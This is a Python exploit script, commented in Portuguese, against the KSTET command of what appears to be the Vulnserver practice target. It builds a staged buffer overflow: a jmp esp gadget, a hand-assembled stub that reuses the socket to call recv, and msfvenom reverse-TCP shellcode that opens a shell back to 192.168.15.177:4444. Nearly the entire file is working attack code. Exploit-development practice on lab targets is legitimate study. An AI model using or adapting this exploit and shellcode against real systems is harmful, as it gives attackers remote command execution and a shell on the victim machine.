#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import socket
from time import sleep
from struct import *

host= "172.30.200.66"

port = 9999

payload  = ""

# Estagio 2 -> Realinhamento da pilha para encontrar o FileDescriptor
payload += "\x54"                   # push esp
payload += "\x59"                   # pop ecx
payload += "\x66\x81\xE9\x44\x01"   # sub cx,0x144


# Reajusta a posição de ESP
# como o ESP  (pilha) está abaixo deste payload, iremos reajustar para uma posição acima
payload += "\x83\xEC\x50"           # sub esp 50

# Estagio 3 -> Calcular parametros do recv
# int recv( SOCKET s, char   *buf, int    len, int    flags );
# Adiciona o 4 parametro (flags)
payload += "\x31\xC0"               # xor eax,eax --> Zera EAX
payload += "\x50"                   # push eax
# Adiciona o 3 parametro (int)
payload += "\x31\xC0"               # xor eax,eax --> Zera EAX
payload += "\xB0\x08"               # mov al,0x8
payload += "\xB4\x02"               # mov ah,0x2
payload += "\x50"                   # push eax --> EAX deve ter o valor 0x00000208 decimal 520
# Adiciona o 2 parametro (*buf), ou seja endereço do Buffer
payload += "\x54"                   # push esp
payload += "\x5A"                   # pop edx
payload += "\x83\xC2\x50"           # ADD EDX, 50
payload += "\x52"                   # push edx
# Adiciona o 1 parametro (socket)
payload += "\xFF\x31"               # PUSH DWORD PTR DS:[ECX]

# Estagio 5 -> CALL <jmp.&ws2_32.recv>
payload += "\xB8\x11\x2C\x25\x40"   # mov eax,0x40252c11
payload += "\xC1\xE8\x08"           # shr eax,byte 0x8
payload += "\xFF\xD0"               # call eax

payload += "\x90" * (66 - len(payload)) # preenche com NOPs

payload += pack('<L',0x625011af)    # 0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll)

# Estagio 1 -> JMP para o inicio do nosso payload (AAAA...)
payload += "\x54"                   # push esp
payload += "\x5A"                   # pop edx
payload += "\x83\xEA\x46"           # sub edx,byte +0x46
payload += "\xFF\xE2"               # jmp edx


buffer  = b"KSTET /.:/"
buffer += payload

shellcode   = ""
#shellcode   += "\xCC"               # Adicionar somente em caso de testes

#  msfvenom -p windows/shell_reverse_tcp lhost=192.168.15.177 lport=4444 -a x86 --platform win -b "\x00" -f python
buf =  ""
buf += "\xda\xce\xbb\x97\xd1\xf5\x14\xd9\x74\x24\xf4\x5a\x29"
buf += "\xc9\xb1\x52\x83\xea\xfc\x31\x5a\x13\x03\xcd\xc2\x17"
buf += "\xe1\x0d\x0c\x55\x0a\xed\xcd\x3a\x82\x08\xfc\x7a\xf0"
buf += "\x59\xaf\x4a\x72\x0f\x5c\x20\xd6\xbb\xd7\x44\xff\xcc"
buf += "\x50\xe2\xd9\xe3\x61\x5f\x19\x62\xe2\xa2\x4e\x44\xdb"
buf += "\x6c\x83\x85\x1c\x90\x6e\xd7\xf5\xde\xdd\xc7\x72\xaa"
buf += "\xdd\x6c\xc8\x3a\x66\x91\x99\x3d\x47\x04\x91\x67\x47"
buf += "\xa7\x76\x1c\xce\xbf\x9b\x19\x98\x34\x6f\xd5\x1b\x9c"
buf += "\xa1\x16\xb7\xe1\x0d\xe5\xc9\x26\xa9\x16\xbc\x5e\xc9"
buf += "\xab\xc7\xa5\xb3\x77\x4d\x3d\x13\xf3\xf5\x99\xa5\xd0"
buf += "\x60\x6a\xa9\x9d\xe7\x34\xae\x20\x2b\x4f\xca\xa9\xca"
buf += "\x9f\x5a\xe9\xe8\x3b\x06\xa9\x91\x1a\xe2\x1c\xad\x7c"
buf += "\x4d\xc0\x0b\xf7\x60\x15\x26\x5a\xed\xda\x0b\x64\xed"
buf += "\x74\x1b\x17\xdf\xdb\xb7\xbf\x53\x93\x11\x38\x93\x8e"
buf += "\xe6\xd6\x6a\x31\x17\xff\xa8\x65\x47\x97\x19\x06\x0c"
buf += "\x67\xa5\xd3\x83\x37\x09\x8c\x63\xe7\xe9\x7c\x0c\xed"
buf += "\xe5\xa3\x2c\x0e\x2c\xcc\xc7\xf5\xa7\x33\xbf\xfa\x86"
buf += "\xdc\xc2\x04\xf8\x40\x4a\xe2\x90\x68\x1a\xbd\x0c\x10"
buf += "\x07\x35\xac\xdd\x9d\x30\xee\x56\x12\xc5\xa1\x9e\x5f"
buf += "\xd5\x56\x6f\x2a\x87\xf1\x70\x80\xaf\x9e\xe3\x4f\x2f"
buf += "\xe8\x1f\xd8\x78\xbd\xee\x11\xec\x53\x48\x88\x12\xae"
buf += "\x0c\xf3\x96\x75\xed\xfa\x17\xfb\x49\xd9\x07\xc5\x52"
buf += "\x65\x73\x99\x04\x33\x2d\x5f\xff\xf5\x87\x09\xac\x5f"
buf += "\x4f\xcf\x9e\x5f\x09\xd0\xca\x29\xf5\x61\xa3\x6f\x0a"
buf += "\x4d\x23\x78\x73\xb3\xd3\x87\xae\x77\xe3\xcd\xf2\xde"
buf += "\x6c\x88\x67\x63\xf1\x2b\x52\xa0\x0c\xa8\x56\x59\xeb"
buf += "\xb0\x13\x5c\xb7\x76\xc8\x2c\xa8\x12\xee\x83\xc9\x36"

shellcode += buf
shellcode += "\x90" * (520 - len(shellcode)) # preenche com NOPs

exp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

exp.connect((host,port))
exp.recv(4096)

print "[*] Enviando exploit..."
exp.send(buffer)
sleep(1)
print "[*] Enviando shellcode..."
exp.send(shellcode)

exp.close()


